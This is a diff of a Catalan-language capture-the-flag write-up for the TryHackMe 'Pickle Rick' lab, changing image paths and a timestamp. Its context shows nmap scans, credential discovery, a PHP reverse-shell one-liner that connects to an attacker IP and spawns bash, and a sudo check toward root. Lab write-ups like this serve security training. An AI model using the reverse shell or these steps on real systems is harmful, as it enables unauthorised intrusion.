@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.957Z
-modified: 2026-09-11T12:24:57.360Z
+modified: 2026-09-11T18:12:58.618Z
 ---
 
 # Pickle Rick
@@ -23,7 +23,7 @@ IP: 10.10.21.47
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports
 ```
 
-![image.png](/images/TryHackMe/image.png)
+![image.png](WriteUps/images/TryHackMe/image.png)
 
 > NMAP Servicios
 
@@ -31,23 +31,23 @@ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n 10.10.21.47 -oG allports
  nmap -sV -script=http-enum 10.10.21.47 -vvv -oN targeted
 ```
 
-![image.png](/images/TryHackMe/image%201.png)
+![image.png](WriteUps/images/TryHackMe/image 1.png)
 
 # Análisis de vulnerabilidades
 
 Código fuente
 
-![image.png](/images/TryHackMe/image%202.png)
+![image.png](WriteUps/images/TryHackMe/image 2.png)
 
 Username : R1ckRul3s
 
 Accedirm a /robots.txt
 
-![image.png](/images/TryHackMe/image%203.png)
+![image.png](WriteUps/images/TryHackMe/image 3.png)
 
 Accedim a /login.php i provem les credencials
 
-![image.png](/images/TryHackMe/image%204.png)
+![image.png](WriteUps/images/TryHackMe/image 4.png)
 
 Llistem arxius i trobem :
 
@@ -65,13 +65,13 @@ Intentem conectarnos amb una rever shell i la que ens funciona es una PHPexec:
 php -r '$sock=fsockopen("10.9.4.64",443);exec("bash <&3 >&3 2>&3");'
 ```
 
-![image.png](/images/TryHackMe/image%205.png)
+![image.png](WriteUps/images/TryHackMe/image 5.png)
 
 Accedim al sistema :
 
 Busquem diferents fichers:
 
-![image.png](/images/TryHackMe/image%206.png)
+![image.png](WriteUps/images/TryHackMe/image 6.png)
 
 Entrem al home de rick i trobem el segon flag
 
@@ -85,7 +85,7 @@ Busquem com ens podem convertir en root:
 sudo -l
 ```
 
-![image.png](/images/TryHackMe/image%207.png)
+![image.png](WriteUps/images/TryHackMe/image 7.png)
 
 Podem executar qualsevol comando sense password
 
